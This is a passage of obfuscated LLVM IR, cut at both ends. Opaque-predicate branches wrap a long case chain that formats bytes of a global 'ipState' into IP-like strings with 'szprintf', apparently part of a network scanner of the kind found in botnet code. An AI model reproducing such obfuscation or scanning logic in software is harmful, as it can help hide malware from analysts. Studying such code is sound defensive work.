  br i1 %164, label %165, label %188

; <label>:165:                                    ; preds = %162
  %166 = load i32, i32* @x.59
  %167 = load i32, i32* @y.60
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %165
  %174 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %175 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %176 = zext i8 %175 to i32
  %177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %178 = zext i8 %177 to i32
  %179 = call i32 (i8*, i8*, ...) @szprintf(i8* %174, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.494, i32 0, i32 0), i32 %176, i32 %178)
  %180 = load i32, i32* @x.59
  %181 = load i32, i32* @y.60
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %188

; <label>:188:                                    ; preds = %originalBBpart224, %162
  %189 = load i32, i32* %1, align 4
  %190 = icmp eq i32 %189, 6
  br i1 %190, label %191, label %214

; <label>:191:                                    ; preds = %188
  %192 = load i32, i32* @x.59
  %193 = load i32, i32* @y.60
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %191
  %200 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %202 = zext i8 %201 to i32
  %203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %204 = zext i8 %203 to i32
  %205 = call i32 (i8*, i8*, ...) @szprintf(i8* %200, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.495, i32 0, i32 0), i32 %202, i32 %204)
  %206 = load i32, i32* @x.59
  %207 = load i32, i32* @y.60
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %214

; <label>:214:                                    ; preds = %originalBBpart228, %188
  %215 = load i32, i32* %1, align 4
  %216 = icmp eq i32 %215, 7
  br i1 %216, label %217, label %224

; <label>:217:                                    ; preds = %214
  %218 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %219 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %220 = zext i8 %219 to i32
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %222 = zext i8 %221 to i32
  %223 = call i32 (i8*, i8*, ...) @szprintf(i8* %218, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.496, i32 0, i32 0), i32 %220, i32 %222)
  br label %224

; <label>:224:                                    ; preds = %217, %214
  %225 = load i32, i32* %1, align 4
  %226 = icmp eq i32 %225, 8
  br i1 %226, label %227, label %234

; <label>:227:                                    ; preds = %224
  %228 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %229 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %230 = zext i8 %229 to i32
  %231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %232 = zext i8 %231 to i32
  %233 = call i32 (i8*, i8*, ...) @szprintf(i8* %228, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.497, i32 0, i32 0), i32 %230, i32 %232)
  br label %234

; <label>:234:                                    ; preds = %227, %224
  %235 = load i32, i32* %1, align 4
  %236 = icmp eq i32 %235, 9
  br i1 %236, label %237, label %260

; <label>:237:                                    ; preds = %234
  %238 = load i32, i32* @x.59
  %239 = load i32, i32* @y.60
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %237
  %246 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %247 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %248 = zext i8 %247 to i32
  %249 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %250 = zext i8 %249 to i32
  %251 = call i32 (i8*, i8*, ...) @szprintf(i8* %246, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.498, i32 0, i32 0), i32 %248, i32 %250)
  %252 = load i32, i32* @x.59
  %253 = load i32, i32* @y.60
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %260

; <label>:260:                                    ; preds = %originalBBpart232, %234
  %261 = load i32, i32* @x.59
  %262 = load i32, i32* @y.60
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %260
  %269 = load i32, i32* %1, align 4
  %270 = icmp eq i32 %269, 10
  %271 = load i32, i32* @x.59
  %272 = load i32, i32* @y.60
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %270, label %279, label %302

; <label>:279:                                    ; preds = %originalBBpart236
  %280 = load i32, i32* @x.59
  %281 = load i32, i32* @y.60
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %279
  %288 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %290 = zext i8 %289 to i32
  %291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %292 = zext i8 %291 to i32
  %293 = call i32 (i8*, i8*, ...) @szprintf(i8* %288, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.489, i32 0, i32 0), i32 %290, i32 %292)
  %294 = load i32, i32* @x.59
  %295 = load i32, i32* @y.60
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %302

; <label>:302:                                    ; preds = %originalBBpart240, %originalBBpart236
  %303 = load i32, i32* %1, align 4
  %304 = icmp eq i32 %303, 11
  br i1 %304, label %305, label %312

; <label>:305:                                    ; preds = %302
  %306 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %307 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %308 = zext i8 %307 to i32
  %309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %310 = zext i8 %309 to i32
  %311 = call i32 (i8*, i8*, ...) @szprintf(i8* %306, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.499, i32 0, i32 0), i32 %308, i32 %310)
  br label %312

; <label>:312:                                    ; preds = %305, %302
  %313 = load i32, i32* %1, align 4
  %314 = icmp eq i32 %313, 12
  br i1 %314, label %315, label %338

; <label>:315:                                    ; preds = %312
  %316 = load i32, i32* @x.59
  %317 = load i32, i32* @y.60
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %315
  %324 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %325 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %326 = zext i8 %325 to i32
  %327 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %328 = zext i8 %327 to i32
  %329 = call i32 (i8*, i8*, ...) @szprintf(i8* %324, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.500, i32 0, i32 0), i32 %326, i32 %328)
  %330 = load i32, i32* @x.59
  %331 = load i32, i32* @y.60
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %338

; <label>:338:                                    ; preds = %originalBBpart244, %312
  %339 = load i32, i32* %1, align 4
  %340 = icmp eq i32 %339, 13
  br i1 %340, label %341, label %364

; <label>:341:                                    ; preds = %338
  %342 = load i32, i32* @x.59
  %343 = load i32, i32* @y.60
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %341
  %350 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %352 = zext i8 %351 to i32
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %354 = zext i8 %353 to i32
  %355 = call i32 (i8*, i8*, ...) @szprintf(i8* %350, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.501, i32 0, i32 0), i32 %352, i32 %354)
  %356 = load i32, i32* @x.59
  %357 = load i32, i32* @y.60
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %364

; <label>:364:                                    ; preds = %originalBBpart248, %338
  %365 = load i32, i32* %1, align 4
  %366 = icmp eq i32 %365, 14
  br i1 %366, label %367, label %374

; <label>:367:                                    ; preds = %364
  %368 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %370 = zext i8 %369 to i32
  %371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %372 = zext i8 %371 to i32
  %373 = call i32 (i8*, i8*, ...) @szprintf(i8* %368, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.502, i32 0, i32 0), i32 %370, i32 %372)
  br label %374

; <label>:374:                                    ; preds = %367, %364
  %375 = load i32, i32* %1, align 4
  %376 = icmp eq i32 %375, 15
  br i1 %376, label %377, label %384

; <label>:377:                                    ; preds = %374
  %378 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %379 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %380 = zext i8 %379 to i32
  %381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %382 = zext i8 %381 to i32
  %383 = call i32 (i8*, i8*, ...) @szprintf(i8* %378, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.503, i32 0, i32 0), i32 %380, i32 %382)
  br label %384

; <label>:384:                                    ; preds = %377, %374
  %385 = load i32, i32* @x.59
  %386 = load i32, i32* @y.60
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %384
  %393 = load i32, i32* %1, align 4
  %394 = icmp eq i32 %393, 16
  %395 = load i32, i32* @x.59
  %396 = load i32, i32* @y.60
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %394, label %403, label %426

; <label>:403:                                    ; preds = %originalBBpart252
  %404 = load i32, i32* @x.59
  %405 = load i32, i32* @y.60
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %403
  %412 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %414 = zext i8 %413 to i32
  %415 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %416 = zext i8 %415 to i32
  %417 = call i32 (i8*, i8*, ...) @szprintf(i8* %412, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.504, i32 0, i32 0), i32 %414, i32 %416)
  %418 = load i32, i32* @x.59
  %419 = load i32, i32* @y.60
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %426

; <label>:426:                                    ; preds = %originalBBpart256, %originalBBpart252
  %427 = load i32, i32* %1, align 4
  %428 = icmp eq i32 %427, 17
  br i1 %428, label %429, label %436

; <label>:429:                                    ; preds = %426
  %430 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %432 = zext i8 %431 to i32
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %434 = zext i8 %433 to i32
  %435 = call i32 (i8*, i8*, ...) @szprintf(i8* %430, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.505, i32 0, i32 0), i32 %432, i32 %434)
  br label %436

; <label>:436:                                    ; preds = %429, %426
  %437 = load i32, i32* %1, align 4
  %438 = icmp eq i32 %437, 18
  br i1 %438, label %439, label %462

; <label>:439:                                    ; preds = %436
  %440 = load i32, i32* @x.59
  %441 = load i32, i32* @y.60
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %439
  %448 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %450 = zext i8 %449 to i32
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %452 = zext i8 %451 to i32
  %453 = call i32 (i8*, i8*, ...) @szprintf(i8* %448, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.506, i32 0, i32 0), i32 %450, i32 %452)
  %454 = load i32, i32* @x.59
  %455 = load i32, i32* @y.60
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %462

; <label>:462:                                    ; preds = %originalBBpart260, %436
  %463 = load i32, i32* %1, align 4
  %464 = icmp eq i32 %463, 19
  br i1 %464, label %465, label %488

; <label>:465:                                    ; preds = %462
  %466 = load i32, i32* @x.59
  %467 = load i32, i32* @y.60
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %465
  %474 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %475 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %476 = zext i8 %475 to i32
  %477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %478 = zext i8 %477 to i32
  %479 = call i32 (i8*, i8*, ...) @szprintf(i8* %474, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.507, i32 0, i32 0), i32 %476, i32 %478)
  %480 = load i32, i32* @x.59
  %481 = load i32, i32* @y.60
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %488

; <label>:488:                                    ; preds = %originalBBpart264, %462
  %489 = load i32, i32* @x.59
  %490 = load i32, i32* @y.60
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %488
  %497 = load i32, i32* %1, align 4
  %498 = icmp eq i32 %497, 20
  %499 = load i32, i32* @x.59
  %500 = load i32, i32* @y.60
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %498, label %507, label %514

; <label>:507:                                    ; preds = %originalBBpart268
  %508 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %509 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %510 = zext i8 %509 to i32
  %511 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %512 = zext i8 %511 to i32
  %513 = call i32 (i8*, i8*, ...) @szprintf(i8* %508, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.508, i32 0, i32 0), i32 %510, i32 %512)
  br label %514

; <label>:514:                                    ; preds = %507, %originalBBpart268
  %515 = load i32, i32* @x.59
  %516 = load i32, i32* @y.60
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %514
  %523 = load i32, i32* %1, align 4
  %524 = icmp eq i32 %523, 21
  %525 = load i32, i32* @x.59
  %526 = load i32, i32* @y.60
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %524, label %533, label %540

; <label>:533:                                    ; preds = %originalBBpart272
  %534 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %535 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %536 = zext i8 %535 to i32
  %537 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %538 = zext i8 %537 to i32
  %539 = call i32 (i8*, i8*, ...) @szprintf(i8* %534, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.509, i32 0, i32 0), i32 %536, i32 %538)
  br label %540

; <label>:540:                                    ; preds = %533, %originalBBpart272
  %541 = load i32, i32* %1, align 4
  %542 = icmp eq i32 %541, 22
  br i1 %542, label %543, label %550

; <label>:543:                                    ; preds = %540
  %544 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %545 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %546 = zext i8 %545 to i32
  %547 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %548 = zext i8 %547 to i32
  %549 = call i32 (i8*, i8*, ...) @szprintf(i8* %544, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.510, i32 0, i32 0), i32 %546, i32 %548)
  br label %550

; <label>:550:                                    ; preds = %543, %540
  %551 = load i32, i32* %1, align 4
  %552 = icmp eq i32 %551, 23
  br i1 %552, label %553, label %560

; <label>:553:                                    ; preds = %550
  %554 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %555 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %556 = zext i8 %555 to i32
  %557 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %558 = zext i8 %557 to i32
  %559 = call i32 (i8*, i8*, ...) @szprintf(i8* %554, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.511, i32 0, i32 0), i32 %556, i32 %558)
  br label %560

; <label>:560:                                    ; preds = %553, %550
  %561 = load i32, i32* %1, align 4
  %562 = icmp eq i32 %561, 24
  br i1 %562, label %563, label %570

; <label>:563:                                    ; preds = %560
  %564 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %565 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %566 = zext i8 %565 to i32
  %567 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %568 = zext i8 %567 to i32
  %569 = call i32 (i8*, i8*, ...) @szprintf(i8* %564, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.512, i32 0, i32 0), i32 %566, i32 %568)
  br label %570

; <label>:570:                                    ; preds = %563, %560
  %571 = load i32, i32* %1, align 4
  %572 = icmp eq i32 %571, 25
  br i1 %572, label %573, label %580

; <label>:573:                                    ; preds = %570
  %574 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %575 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %576 = zext i8 %575 to i32
  %577 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %578 = zext i8 %577 to i32
  %579 = call i32 (i8*, i8*, ...) @szprintf(i8* %574, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.513, i32 0, i32 0), i32 %576, i32 %578)
  br label %580

; <label>:580:                                    ; preds = %573, %570
  %581 = load i32, i32* @x.59
  %582 = load i32, i32* @y.60
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %580
  %589 = load i32, i32* %1, align 4
  %590 = icmp eq i32 %589, 26
  %591 = load i32, i32* @x.59
  %592 = load i32, i32* @y.60
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %590, label %599, label %622

; <label>:599:                                    ; preds = %originalBBpart276
  %600 = load i32, i32* @x.59
  %601 = load i32, i32* @y.60
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %599
  %608 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %609 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %610 = zext i8 %609 to i32
  %611 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %612 = zext i8 %611 to i32
  %613 = call i32 (i8*, i8*, ...) @szprintf(i8* %608, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.514, i32 0, i32 0), i32 %610, i32 %612)
  %614 = load i32, i32* @x.59
  %615 = load i32, i32* @y.60
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %622

; <label>:622:                                    ; preds = %originalBBpart280, %originalBBpart276
  %623 = load i32, i32* %1, align 4
  %624 = icmp eq i32 %623, 27
  br i1 %624, label %625, label %632

; <label>:625:                                    ; preds = %622
  %626 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %628 = zext i8 %627 to i32
  %629 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %630 = zext i8 %629 to i32
  %631 = call i32 (i8*, i8*, ...) @szprintf(i8* %626, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.515, i32 0, i32 0), i32 %628, i32 %630)
  br label %632

; <label>:632:                                    ; preds = %625, %622
  %633 = load i32, i32* %1, align 4
  %634 = icmp eq i32 %633, 28
  br i1 %634, label %635, label %642

; <label>:635:                                    ; preds = %632
  %636 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %637 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %638 = zext i8 %637 to i32
  %639 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %640 = zext i8 %639 to i32
  %641 = call i32 (i8*, i8*, ...) @szprintf(i8* %636, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.516, i32 0, i32 0), i32 %638, i32 %640)
  br label %642

; <label>:642:                                    ; preds = %635, %632
  %643 = load i32, i32* @x.59
  %644 = load i32, i32* @y.60
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
